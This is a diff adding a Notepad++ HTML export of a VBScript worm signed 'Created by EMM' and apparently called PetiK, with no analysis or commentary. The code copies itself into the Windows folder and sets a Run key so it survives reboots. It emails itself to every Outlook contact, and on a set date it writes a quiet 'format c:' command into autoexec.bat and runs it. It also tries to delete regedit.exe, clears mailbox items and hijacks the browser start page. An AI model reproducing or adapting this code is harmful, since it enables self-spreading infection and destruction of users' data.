@@ -1,0 +1,102 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'Created by EMM
+</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">wsh</span><span class="sc0">
+ </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wsh</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+ </span><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0"> 
+ </span><span class="sc7">wsh.regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\kv3000"</span><span class="sc6">,</span><span class="sc4">"c:\windows\PetiK.vbe"</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Createobject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">InF</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullname</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">InF.AtEndOfStream</span><span class="sc6">&lt;&gt;</span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">ScriptBuffer</span><span class="sc6">=</span><span class="sc7">ScriptBuffer&amp;InF.ReadLine&amp;vbcrlf</span><span class="sc0"> 
+</span><span class="sc3">Loop</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">OutF</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc4">"c:\windows\PetiK.vbe"</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">true</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">OutF.write</span><span class="sc0"> </span><span class="sc7">ScriptBuffer</span><span class="sc0">
+ </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">wsh.regread</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKCU\software\a\a"</span><span class="sc6">)&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">  </span><span class="sc7">out</span><span class="sc0">
+</span><span class="sc3">sub</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Outlook</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Outlook</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Mapi</span><span class="sc6">=</span><span class="sc7">Outlook.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Lists</span><span class="sc6">=</span><span class="sc7">Mapi.AddressLists</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">ListIndex</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Lists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ListIndex.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">ContactCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ListIndex.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Count</span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">ContactCount</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Mail</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Outlook.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Contact</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ListIndex.AddressEntries</span><span class="sc6">(</span><span class="sc7">Count</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">Mail.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Contact.Address</span><span class="sc0">
+</span><span class="sc7">Mail.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hey you !!!"</span><span class="sc0">
+</span><span class="sc7">Mail.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Here it is for you !!!"</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Attachment</span><span class="sc6">=</span><span class="sc7">Mail.Attachments</span><span class="sc0">
+ </span><span class="sc7">Attachment.Add</span><span class="sc0"> </span><span class="sc7">Folder</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" c:\windows\PetiK.vbe"</span><span class="sc0">
+</span><span class="sc7">Mail.Send</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+ </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+ </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">
+</span><span class="sc7">wsh.regwrite</span><span class="sc0"> </span><span class="sc4">"HKCU\software\a\a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0">
+ 
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">year</span><span class="sc6">(</span><span class="sc3">date</span><span class="sc6">)&amp;</span><span class="sc7">month</span><span class="sc6">(</span><span class="sc3">date</span><span class="sc6">)&amp;</span><span class="sc7">day</span><span class="sc6">(</span><span class="sc3">date</span><span class="sc6">)=</span><span class="sc0"> </span><span class="sc2">2001125</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0">
+</span><span class="sc3">sub</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0">
+</span><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">fso.DeleteFile</span><span class="sc6">(</span><span class="sc4">"c:\winodows\regedit.exe"</span><span class="sc6">)</span><span class="sc0">
+
+ </span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">WshShell</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Wscript.CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0"> 
+</span><span class="sc7">WshShell.Run</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"start.exe /m format c:/q /autotest /u"</span><span class="sc0"> </span><span class="sc6">)</span><span class="sc0">
+ </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Script</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc0"> </span><span class="sc4">"c:\autoexec.bat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0"> 
+</span><span class="sc7">Script.writeline</span><span class="sc0"> </span><span class="sc4">"format c:/q /autotest /u"</span><span class="sc0"> 
+ </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Outlook</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc6">=</span><span class="sc7">s.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">u</span><span class="sc6">=</span><span class="sc7">t.GetDefaultFolder</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc7">u.items.count</span><span class="sc0">
+</span><span class="sc7">u.Items.Item</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">).</span><span class="sc10">delete</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">
+</span><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">fso.DeleteFile</span><span class="sc6">(</span><span class="sc4">"c:\winodows\regedit.exe"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Outlook</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc6">=</span><span class="sc7">s.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">u</span><span class="sc6">=</span><span class="sc7">t.GetDefaultFolder</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc7">u.items.count</span><span class="sc0">
+</span><span class="sc7">u.Items.Item</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">).</span><span class="sc10">delete</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">wsh.regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://zsyangel.yeah.net"</span><span class="sc0">
+</span><span class="sc7">wsh.regwrite</span><span class="sc4">"HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Window Title"</span><span class="sc6">,</span><span class="sc4">"PetiK"</span><span class="sc0">
+</span></div></body>
+</html>
